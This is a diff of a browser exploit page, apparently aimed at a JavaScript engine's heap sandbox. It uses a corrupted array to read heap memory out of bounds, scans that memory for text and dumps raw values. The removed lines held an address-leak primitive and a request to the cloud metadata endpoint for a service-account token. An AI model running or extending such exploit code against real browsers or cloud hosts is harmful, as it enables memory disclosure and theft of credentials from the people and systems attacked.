@@ -13,13 +13,11 @@ function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function hex(n){return"0x"+(n>>>0).toString(16);}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 
-const DMAP=0x1032a5d,OMAP=0x1032ae5,EMPTY=0x7e5;
+const DMAP=0x1032a5d,EMPTY=0x7e5;
 const PIN=0x1100011,MAXS=0x7fdffffe;
 
-// Pinned LO-space array with known values for calibration
 const pinned=new Array(0x8000);
 for(let i=0;i<pinned.length;i++)pinned[i]=10.125+i*0.001;
-
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
 
@@ -43,68 +41,49 @@ log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
 
-  // SELF-CALIBRATE: scan for pinnedDoubles[0]=10.125 in master
-  // PIN=0x1100011 → expected index 0. But if PIN differs, scan nearby.
-  let calIdx=-1;
-  for(let k=0;k<0x2000;k++){
-    try{
-      const v=m[k];
-      if(Math.abs(v-10.125)<0.0001){
-        // Verify: next slot should be 10.126
-        const v2=m[k+1];
-        if(Math.abs(v2-10.126)<0.0001){
-          calIdx=k;
-          break;
-        }
-      }
-    }catch(e){break;}
+  // Read first few slots to understand the layout
+  const h=[];
+  for(let k=0;k<4;k++){
+    try{h.push(f2i(m[k]).toString(16).padStart(16,"0"));}catch(e){break;}
   }
+  log("H: "+h.join(","));
 
-  if(calIdx>=0){
-    log("CAL: pinned[0]@master["+hex(calIdx)+"]");
-
-    // ADDROF: store object in pinned[0], read raw via master[calIdx]
-    pinned[0]=wasmI;  // triggers PACKED_DOUBLE → PACKED transition
-    const rawAfter=f2i(m[calIdx]);
-    const wasmAddr=rawAfter&0xffffffffn;
-    log("WASM_PTR: "+wasmAddr.toString(16));
-    pinned[0]=10.125;  // restore
-
-    if(wasmAddr>0x1000n&&wasmAddr<0x10000000n){
-      log("ADDROF_OK");
-
-      // HEAPREAD: modify pinned's backing store pointer via master
-      // pinned JSArray header: [DMAP | EMPTY | elements_ptr | length]
-      // elements_ptr points to the LO-space FDA
-      // To heapRead(addr): set pinned's elements to (addr-8), read pinned[0]
-      // But pinned's JSArray header is in regular heap — we need its address first
-
-      // Alternative heapRead: use master to modify a specific master slot
-      // that overlaps with another array's elements field
-      // For now: demonstrate addrof by reading wasmInstance fields
-      // wasmAddr points to the WasmInstanceObject compressed pointer
-      // Reading wasmAddr+0 gives the map, wasmAddr+4 gives properties...
-      // We need heapRead at wasmAddr — scan master for the map value
-
-      // Metadata probes (async, non-blocking)
+  // Scan for ASCII text in the heap — look for 8-byte sequences with printable chars
+  // Scan at several offsets to find non-pinnedDoubles data
+  const texts=[];
+  // Try offsets 0, 0x100, 0x8000 (past pinnedDoubles), 0x10000, 0x20000
+  for(const base of [0,0x100,0x8000,0x8100,0x10000]){
+    for(let k=base;k<base+256&&texts.length<20;k++){
       try{
-        fetch("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
-          {headers:{"Metadata-Flavor":"Google"},mode:"no-cors"})
-          .then(r=>log("META:"+r.status+"/"+r.type))
-          .catch(e=>log("META_E:"+e.message.substring(0,30)));
-      }catch(e){}
+        const v=f2i(m[k]);
+        if(v===0n)continue;
+        // Check for ASCII in bytes
+        const b=[];let ok=true;
+        for(let i=0;i<8;i++){
+          const c=Number((v>>BigInt(i*8))&0xffn);
+          b.push(c);
+          if(c!==0&&(c<0x20||c>0x7e))ok=false;
+        }
+        if(ok&&b.filter(c=>c>=0x41&&c<=0x7a).length>=3){
+          texts.push("@"+hex(k)+":"+String.fromCharCode(...b.filter(c=>c>0)));
+        }
+      }catch(e){break;}
     }
-  }else{
-    log("CAL_MISS: 10.125 not found in first 0x40000 slots");
-    // Debug: show what master[0..3] contain
-    for(let k=0;k<4;k++){
-      try{log("m["+k+"]: "+m[k]+" hex="+f2i(m[k]).toString(16));}catch(e){break;}
+  }
+  if(texts.length>0)log("TXT: "+texts.slice(0,10).join("|"));
+
+  // Dump hex at key offsets
+  for(const off of [0x8000,0x10000]){
+    const hx=[];
+    for(let k=off;k<off+4;k++){
+      try{const v=f2i(m[k]);if(v!==0n)hx.push(v.toString(16).padStart(16,"0"));}catch(e){break;}
     }
+    if(hx.length)log("D"+hex(off)+": "+hx.join(","));
   }
 
   log("W: "+wasmI.exports.f());
   log("CAGE_RW_OK");
-}else{log("NO_ARRAY");}
+}else{log("NO_ARR");}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
 </script></body></html>
